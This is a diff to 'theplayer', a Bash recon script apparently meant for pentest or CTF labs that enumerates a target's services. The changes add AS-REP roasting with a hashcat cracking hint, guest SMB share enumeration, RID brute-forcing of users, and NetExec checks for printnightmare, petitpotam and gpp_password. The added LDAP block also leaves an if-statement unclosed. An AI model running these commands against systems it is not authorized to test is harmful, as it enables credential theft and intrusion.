@@ -43,7 +43,7 @@ handle_interrupt() {
 trap handle_interrupt SIGINT
 
 figlet The Player
-echo "             Version:0.5.0  Surgat"
+echo "             Version:0.5.1  Surgat"
 
 if [ -z "$ipvictima" ] || [ -z "$nombre" ]; then
     echo "Usage: theplayer <IP> <NAME OF MACHINE>"
@@ -99,7 +99,7 @@ fi
     # Verify port 443 is open https
     
 if echo "$ports" | grep -q "\<443\>"; then
-    echo -e "${YELLOW}/n[+] Find 443 port open in IP $ipvictima/n${NC}"
+    echo -e "${YELLOW}\n[+] Find 443 port open in IP $ipvictima Check https cert for subdomains /n${NC}"
     echo -e "${GREEN}                  You should run nikto in other terminal${NC}"
     echo -e "${GREEN}                  nikto -h https://$ipvictima -C all${NC}"
     echo ""
@@ -111,32 +111,63 @@ if echo "$ports" | grep -q "\<443\>"; then
     echo -e "${NC}"
 fi
 
+# ldap and search for aspreproast
+
+if echo "$ports" | grep -q "389\|3268\|636\|3269"; then
+    echo "-----------------------"
+    echo -e "${GREEN}\n[+] Find 389 o 3268 open, en IP $ipvictima${NC}"
+    echo "-----------------------/n"
+    echo -e "${YELLOW}[-] Runing search for asreproast:${NC}"
+    nxc ldap $ipvictima -u 'guest' -p '' --asreproast output.txt
+    echo -e "${GREEN}\n    if is vulnerable for aspreproast use  hashcat -m18200 output.txt wordlist ${NC}"
+echo "-----------------------/n"
+
     # Verify ports 139 o 445 are open smb
     
 if echo "$ports" | grep -q "139\|445"; then
     echo "-----------------------"
-    echo -e "${GREEN}/n[+] Find 139 o 445 open, en IP $ipvictima${NC}"
+    echo -e "${GREEN}\n[+] Find 139 o 445 open, en IP $ipvictima${NC}"
     echo "-----------------------/n"
-    echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials${NC}"
+    echo -e "${YELLOW}[-] Runing enumeration SMB,LDAP,rpc, withowt Credentials, enum4linux-ng:${NC}"
+    enum4linux-ng -Adv -oA enum4linuxreultado $ipvictima
+    echo "-----------------------/n"
+    echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials, ntbscan:${NC}"
     nbtscan $ipvictima
-    echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials 1/3 ${NC}"
-    smbmap -H $ipvictima
-    echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials 2/3 ${NC}"
-    smbmap -H $ipvictima -u null -p null
-    echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials 3/3 ${NC}"
-    smbmap -H $ipvictima -u guest
+#   echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials 1/3 ${NC}"
+#   smbmap -H $ipvictima
+#   echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials 2/3 ${NC}"
+#   smbmap -H $ipvictima -u null -p null
+#   echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials 3/3 ${NC}"
+#   smbmap -H $ipvictima -u guest
+    echo "-----------------------/n"
+    echo -e "${YELLOW}[-] smbclient:${NC}"
     smbclient -N -L //$ipvictima
-    crackmapexec smb $ipvictima
+#   crackmapexec smb $ipvictima
+    echo -e "${YELLOW}[-] SMB and password policy with crackmapexec blank user and password:${NC}"
     crackmapexec smb $ipvictima --pass-pol -u "" -p ""
+    echo -e "${YELLOW}[-] SMB and password policy with crackmapexec user guest:${NC}"
     crackmapexec smb $ipvictima --pass-pol -u guest
+    echo "-----------------------/n"
+    echo -e "${YELLOW}[-] Testing NetExec first only for shares:${NC}"
+    nxc smb $ipvictima -u 'guest' -p '' --shares
+    echo "-----------------------/n"
+    echo -e "${YELLOW}[-] Testing NetExec first only for shares AND FILTER ONLY FOR SUBSCRIBERS ONLY READ WRITE:${NC}"
+    nxc smb $ipvictima -u 'guest' -p '' --shares --filter-shares READ WRITE
+    echo "-----------------------/n"
+    echo -e "${YELLOW}[-] Testing NetExec bruteforce users:${NC}"
+    nxc smb $ipvictima -u 'guest' -p '' --rid-brute 10000
+    echo "-----------------------/n"
+    echo -e "${YELLOW}[-] Testing NetExec MODULES OF VULNS:${NC}"
+    nxc smb $ipvictima -u 'guest' -p '' -M enum_av -M spooler -M printnightmare -M shadowcoerce -M petitpotam -M dfscoerce -M gpp_autologin -M gpp_password -M shadowcoerce -M spooler
+    echo "-----------------------/n"
 fi
-echo -e "${GREEN}/n      [-] Waiting to finish complete Nmap in background...${NC}"
+echo -e "${GREEN}\n      [-] Waiting to finish complete Nmap in background...${NC}"
 
 wait
 
 ## Host name to /etc/hosts
 echo "-----------------------"
-echo -e "${YELLOW}/n[+] Searching for hostnames in Nmap output...${NC}"
+echo -e "${YELLOW}\n[+] Searching for hostnames in Nmap output...${NC}"
 echo "-----------------------"
 # Searching hostnames in Nmap output
 urls=$(xmllint --xpath '//host/ports/port/script[@id="http-title" and @output!=""]/@output' ResultNmap$nombre | sed -n -E 's/.*(https?|http):\/\/([^/]+).*/\2/p')
@@ -145,7 +176,7 @@ for hostname in $urls; do
     if ! grep -q "$hostname" /etc/hosts; then
         echo ""
         echo -e "${GREEN}       Adding ${YELLOW} $hostname ${GREEN}to /etc/hosts ${NC}"
-        echo "$ipvictima $(dig +short "$hostname") $hostname # added by theplayer.sh" | sudo tee -a /etc/hosts >/dev/null
+        echo "$ipvictima $(dig +short "$hostname")$hostname # added by theplayer.sh" | sudo tee -a /etc/hosts >/dev/null
     else
         echo ""
         echo -e "${GREEN}        Skipping${YELLOW} $hostname ${GREEN}because it already exists in /etc/hosts${NC}"
@@ -153,10 +184,10 @@ for hostname in $urls; do
 done
 
 if [ -z "$urls" ]; then
-    echo -e "${LIGHT_CYAN}/n[-]       No hostnames found in the results of Nmap.${NC}"
+    echo -e "${LIGHT_CYAN}\n[-]       No hostnames found in the results of Nmap.${NC}"
 else
     echo ""
-    echo -e "${YELLOW}/n[+]       Hostnames found:${NC}"
+    echo -e "${YELLOW}\n[+]       Hostnames found:${NC}"
     echo "$urls"
 fi
 
